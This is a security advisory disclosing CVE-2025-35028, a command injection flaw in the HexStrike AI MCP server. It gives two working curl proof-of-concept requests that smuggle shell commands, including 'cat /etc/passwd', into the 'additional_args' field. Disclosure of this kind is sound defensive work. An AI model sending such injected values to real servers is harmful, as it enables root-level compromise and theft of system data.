# CVE-2025-35028: HexStrike AI MCP Server Comamand Injection

[AHA!] has discovered an issue with HexStrike AI from
[0x4m4](https://www.0x4m4.com), and is issuing this disclosure in accordance
with AHA!'s standard [disclosure policy] on November 30, 2025. [CVE-2025-35028]
has been assigned to this issue. Any questions about this disclosure should be
directed to cve@takeonme.org.

The [GCVE](https://gcve.eu/about/) identifier for this issue is <span style="white-space: nowrap;">[GCVE-1337-2025-00000000000000000000000000000000000000000000000000111111111111111111111111000000000000000000000000000000000000000000000000000000011]</span>

# Executive Summary

[HexStrike AI](https://github.com/0x4m4/hexstrike-ai) is a fairly popular model
context protocol (MCP) server, having collected about five thousand stars on
GitHub at the time of this disclosure, and has been forked over a thousand times.
It is billed as an "AI-Powered MCP Cybersecurity Automation Platform," and is
likely shipping as part of other AI security products.

By providing a command-line argument starting with a semi-colon `;` to an
API endpoint created by the `EnhancedCommandExecutor` class of the HexStrike AI MCP
server, the resultant composed command is executed directly in the context of
the MCP server's normal privilege; typically, this is `root`. There is no
attempt to sanitize these arguments in the default configuration of this MCP
server.

This appears to be an instance of [CWE-78], and has an estimated CVSSv3.1 score
of *9.1*
([CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N](https://www.first.org/cvss/calculator/3-1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)).
Note that this CVSS rating presumes the MCP server is run as-is in a default
state, with no user authentication.

# Technical Details

It is trivial for an attacker to inject additional commands via the
`EnhancedCommandExecutor` object, near
https://github.com/0x4m4/hexstrike-ai/blob/master/hexstrike_server.py#L6783.

The below is a straightforward example using a typical `nmap` command exposed by
`EnhancedCommandExecutor`, tested against commit
[33267047667b9accfbf0fdac1c1c7ff12f3a5512](https://github.com/0x4m4/hexstrike-ai/commit/33267047667b9accfbf0fdac1c1c7ff12f3a5512)
the shipping version on September 25, 2025 (this project does not appear to use
version numbers or tagged releases.)

## Demo 1:

```
curl -X POST http://localhost:8888/api/tools/nmap \
  -H "Content-Type: application/json" \
  -d '{"target": "127.0.0.1", "scan_type": "-sV -Pn", "ports": "443,80,5000", "additional_args": ";echo `whoami`"}'|jq -r '.stdout'
```

## Demo 2:

```
curl -X POST http://localhost:8888/api/tools/nmap \
  -H "Content-Type: application/json" \
  -d '{"target": "127.0.0.1", "scan_type": "-sV -Pn", "ports": "443,80,5000", "additional_args": ";cat /etc/passwd"}'|jq -r '.stdout'
```

These demos return the results of the appended commands to the user via stdout.

# Attacker Value

Should this MCP server be bound to a network interface reachable over normal
TCP/IP, this can lead to a total compromise of the MCP server's environment.
This is the normal configuration and usage of the
[hexstrike-ai](https://github.com/0x4m4/hexstrike-ai) MCP project, which, as
mentioned, is a fairly popular API harness for providing cybersecurity tooling
for evaluation and penetration testing.
